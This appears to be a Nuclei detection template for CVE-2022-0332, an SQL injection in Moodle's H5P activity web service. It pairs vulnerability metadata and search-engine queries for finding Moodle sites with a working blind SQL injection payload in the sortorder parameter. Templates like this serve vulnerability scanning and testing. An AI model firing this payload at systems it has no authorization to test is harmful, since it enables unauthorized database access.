id: CVE-2022-0332

info:
  name: SQL Injection in Moodle H5P Activity Web Service
  author: ProjectDiscoveryAI
  severity: critical
  description: A flaw was found in Moodle in versions 3.11 to 3.11.4. An SQL injection risk was identified in the h5p activity web service responsible for fetching user attempt data.
  impact: |
    Allows attackers to execute arbitrary SQL queries and potentially gain unauthorized access to the database.
  remediation: |
    Apply the vendor-supplied patch or update to the latest version of Moodle to mitigate the SQL Injection vulnerability.
  reference: |-
    https://github.com/numanturle/CVE-2022-0332
    https://bugzilla.redhat.com/show_bug.cgi?id=2043661
    https://github.com/pen4uin/vulnerability-research
    https://github.com/whoforget/CVE-POC
    https://github.com/youwizard/CVE-POC
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-0332
    cwe-id: CWE-89
    epss-score: 0.00233
    epss-percentile: 0.62061
    cpe: cpe:2.3:a:moodle:moodle:*:*:*:*:*:*:*:*
  metadata:
    vendor: moodle
    product: moodle
    shodan-query: title:"Moodle"
    fofa-query:
      - body="moodle"
      - title="installation moodle"
      - title="moodle"
    google-query:
      - intitle:"installation moodle"
      - intitle:"moodle"

http:
  - method: GET
    path:
      - "/moodle-3.11.4/webservice/rest/server.php?wstoken=98f7d8003180afbd46ee160fdc05a4fc&wsfunction=mod_h5pactivity_get_user_attempts&moodlewsrestformat=json&h5pactivityid=1&sortorder=%28SELECT%20%28CASE%20WHEN%20%28ORD%28MID%28%28IFNULL%28CAST%28DATABASE%28%29%20AS%20NCHAR%29%2C0x20%29%29%2C4%2C1%29%29%3E104%29%20THEN%20%27%27%20ELSE%20%28SELECT%205080%20UNION%20SELECT%204100%29%20END%29%29"

    headers:
      Cache-Control: "no-cache"
      User-Agent: "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0"
      Accept: "*/*"
      Accept-Encoding: "gzip, deflate"
      Connection: "close"
    matchers:
      - type: word
        words:
          - "5080"
          - "4100"
        part: body
